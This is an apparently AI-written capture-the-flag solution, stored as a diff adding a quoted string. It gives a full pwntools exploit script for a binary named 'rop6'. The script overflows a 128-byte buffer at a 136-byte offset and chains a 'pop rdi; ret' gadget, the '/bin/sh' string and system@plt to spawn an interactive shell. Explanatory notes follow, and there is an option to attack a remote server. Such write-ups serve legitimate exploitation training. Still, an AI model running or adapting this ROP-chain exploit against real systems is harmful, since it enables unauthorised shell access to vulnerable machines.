@@ -1,0 +1,87 @@
+("To solve this challenge using pwntools, we'll exploit a buffer overflow "
+ 'vulnerability in the `vulnerable_function` to overwrite the return address '
+ 'and execute a ROP chain. The goal is to call `system("/bin/sh")` to get a '
+ "shell. We'll find the offset to the return address, locate necessary gadgets "
+ 'and addresses, build the payload, and interact with the shell.\n'
+ '\n'
+ '**Imports:**\n'
+ '\n'
+ '```python\n'
+ 'from pwn import *\n'
+ '```\n'
+ '\n'
+ '**Functioning Code:**\n'
+ '\n'
+ '```python\n'
+ 'from pwn import *\n'
+ '\n'
+ '# Set up pwntools context\n'
+ "context.binary = elf = ELF('./rop6')\n"
+ "context.log_level = 'debug'  # Set to 'info' or 'debug' for more output\n"
+ "# context.terminal = ['tmux', 'splitw', '-h']  # Uncomment if you want to "
+ 'debug with GDB\n'
+ '\n'
+ '# Start the process (or connect remotely)\n'
+ 'p = elf.process()\n'
+ "# p = remote('challenge_server', port)  # Use this if connecting remotely\n"
+ '\n'
+ '# Find the offset to control the return address\n'
+ 'offset = 136  # Buffer size (128) + saved RBP (8)\n'
+ '\n'
+ '# Find necessary gadgets and addresses\n'
+ 'rop = ROP(elf)\n'
+ "pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]  # Gadget to control RDI\n"
+ "bin_sh = next(elf.search(b'/bin/sh'))  # Address of '/bin/sh' string\n"
+ "system = elf.plt['system']  # Address of 'system' function in PLT\n"
+ '\n'
+ '# Build the payload\n'
+ "payload = b'A' * offset  # Padding to reach the return address\n"
+ "payload += p64(pop_rdi)  # Address of 'pop rdi; ret' gadget\n"
+ "payload += p64(bin_sh)   # Address of '/bin/sh' string\n"
+ "payload += p64(system)   # Address of 'system' function\n"
+ '\n'
+ '# Send the payload\n'
+ "p.sendlineafter('Input:\\n', payload)\n"
+ '\n'
+ '# Interact with the shell\n'
+ 'p.interactive()\n'
+ '```\n'
+ '\n'
+ '**Explanation:**\n'
+ '\n'
+ '1. **Setup:**\n'
+ "   - We load the binary using `ELF('./rop6')` to access its symbols and "
+ 'sections.\n'
+ '   - We start the process locally; adjust as needed for remote challenges.\n'
+ '\n'
+ '2. **Find Offset:**\n'
+ "   - The buffer is 128 bytes, and there's an 8-byte saved base pointer "
+ '(`RBP`), so the offset to the return address is 136 bytes.\n'
+ '\n'
+ '3. **Locate Gadgets and Addresses:**\n'
+ '   - We use `ROP(elf)` to find gadgets within the binary.\n'
+ '   - `pop rdi; ret` gadget is needed to set up the argument for `system`.\n'
+ "   - We locate the `/bin/sh` string within the binary's data section.\n"
+ '   - We get the address of `system` from the Procedure Linkage Table (PLT).\n'
+ '\n'
+ '4. **Build Payload:**\n'
+ '   - We create padding to overflow the buffer and reach the return address.\n'
+ '   - We add the gadget to set `RDI` to point to `/bin/sh`.\n'
+ '   - We call `system` with the argument set to `/bin/sh`.\n'
+ '\n'
+ '5. **Execution:**\n'
+ '   - We send the payload after the program prompts for input.\n'
+ '   - We interact with the shell using `p.interactive()`.\n'
+ '\n'
+ '**Note:** Ensure that the binary `rop6` is in the same directory as the '
+ 'script or provide the correct path. If the challenge is remote, replace the '
+ 'process with a remote connection.\n'
+ '\n'
+ '**Additional Tips:**\n'
+ '\n'
+ '- If you need to debug, you can insert `gdb.attach(p)` before sending the '
+ 'payload.\n'
+ '- Adjust the logging level with `context.log_level` for more or less verbose '
+ 'output.\n'
+ '- Review the binary with tools like `checksec`, `objdump`, or `readelf` to '
+ 'understand its properties.')
